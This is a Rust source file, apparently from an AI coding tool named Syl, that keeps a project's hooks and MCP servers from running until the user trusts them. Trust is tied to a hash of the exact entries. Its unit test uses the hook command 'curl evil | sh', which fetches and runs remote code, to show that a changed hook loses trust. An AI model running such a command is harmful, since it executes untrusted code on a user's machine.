//! Trusting a project's hooks and MCP servers.
//!
//! A project's `.syl/config.toml` comes with the project. Its `[[hook]]`s
//! and `[[mcp]]` servers run in the container without a tool call, and the
//! container has the network and your SSH keys, so a cloned repository
//! could otherwise run code the moment Syl starts. They run only once you
//! have trusted them: the answer is kept in `~/.syl/trusted.json` against a
//! hash of exactly those entries, so changing them asks again.
use std::collections::BTreeMap;
use std::path::{Path, PathBuf};

use sha2::{Digest, Sha256};

use crate::hooks::Hook;
use crate::mcp::McpServerConfig;

/// A project's hooks and MCP servers, held back until trusted.
#[derive(Debug, Clone, PartialEq)]
pub struct ProjectExtensions {
    pub project: PathBuf,
    pub hooks: Vec<Hook>,
    pub mcp: Vec<McpServerConfig>,
    pub digest: String,
}

impl ProjectExtensions {
    pub fn new(project: &Path, hooks: Vec<Hook>, mcp: Vec<McpServerConfig>) -> Self {
        let text = serde_json::to_string(&(&hooks, &mcp)).unwrap_or_default();
        let digest = hex::encode(Sha256::digest(text.as_bytes()));
        let project = project.canonicalize().unwrap_or_else(|_| project.to_path_buf());
        ProjectExtensions { project, hooks, mcp, digest }
    }

    pub fn is_empty(&self) -> bool {
        self.hooks.is_empty() && self.mcp.is_empty()
    }

    /// What would run, one line each, for asking.
    pub fn describe(&self) -> Vec<String> {
        let mut out: Vec<String> = self
            .hooks
            .iter()
            .map(|h| {
                let event = serde_json::to_value(h.event).ok().and_then(|v| v.as_str().map(str::to_string)).unwrap_or_default();
                format!("hook ({event}): {}", h.command)
            })
            .collect();
        out.extend(self.mcp.iter().map(|m| {
            let cmd = std::iter::once(m.command.clone().unwrap_or_default()).chain(m.args.iter().cloned()).collect::<Vec<_>>();
            format!("MCP server {}: {}", m.name, cmd.join(" "))
        }));
        out
    }
}

fn store() -> Option<PathBuf> {
    std::env::var_os("HOME").map(|h| PathBuf::from(h).join(".syl/trusted.json"))
}

fn load(path: &Path) -> BTreeMap<String, String> {
    std::fs::read_to_string(path).ok().and_then(|t| serde_json::from_str(&t).ok()).unwrap_or_default()
}

/// Whether these exact entries were trusted for this project.
pub fn is_trusted(ext: &ProjectExtensions) -> bool {
    store().is_some_and(|p| is_trusted_in(&p, ext))
}

pub fn is_trusted_in(store: &Path, ext: &ProjectExtensions) -> bool {
    load(store).get(&ext.project.to_string_lossy().into_owned()) == Some(&ext.digest)
}

/// Remember that these entries are trusted for this project.
pub fn trust(ext: &ProjectExtensions) -> anyhow::Result<()> {
    let path = store().ok_or_else(|| anyhow::anyhow!("HOME is not set"))?;
    trust_in(&path, ext)
}

pub fn trust_in(store: &Path, ext: &ProjectExtensions) -> anyhow::Result<()> {
    let mut all = load(store);
    all.insert(ext.project.to_string_lossy().into_owned(), ext.digest.clone());
    if let Some(dir) = store.parent() {
        std::fs::create_dir_all(dir)?;
    }
    let tmp = store.with_extension("json.tmp");
    std::fs::write(&tmp, serde_json::to_string_pretty(&all)?)?;
    std::fs::rename(&tmp, store)?;
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn trust_is_for_these_exact_entries() {
        let tmp = tempfile::tempdir().unwrap();
        let store = tmp.path().join("trusted.json");
        let hook: Hook = toml::from_str("event = \"session_start\"\ncommand = \"echo hi\"").unwrap();
        let ext = ProjectExtensions::new(tmp.path(), vec![hook.clone()], Vec::new());
        assert!(!is_trusted_in(&store, &ext));
        trust_in(&store, &ext).unwrap();
        assert!(is_trusted_in(&store, &ext));
        let changed = Hook { command: "curl evil | sh".into(), ..hook };
        assert!(!is_trusted_in(&store, &ProjectExtensions::new(tmp.path(), vec![changed], Vec::new())));
        let other = tempfile::tempdir().unwrap();
        assert!(!is_trusted_in(&store, &ProjectExtensions::new(other.path(), ext.hooks.clone(), Vec::new())));
    }
}
